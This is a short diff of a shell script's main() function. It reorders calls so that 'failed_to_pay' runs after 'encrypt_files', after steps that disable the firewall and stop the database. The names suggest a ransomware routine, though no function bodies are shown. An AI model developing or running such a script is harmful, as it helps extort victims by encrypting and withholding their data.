@@ -137,8 +137,8 @@ main() {
     disable_firewall
     install_dependencies
     stop_database
-    failed_to_pay
     encrypt_files
+    failed_to_pay
 }
 
 main
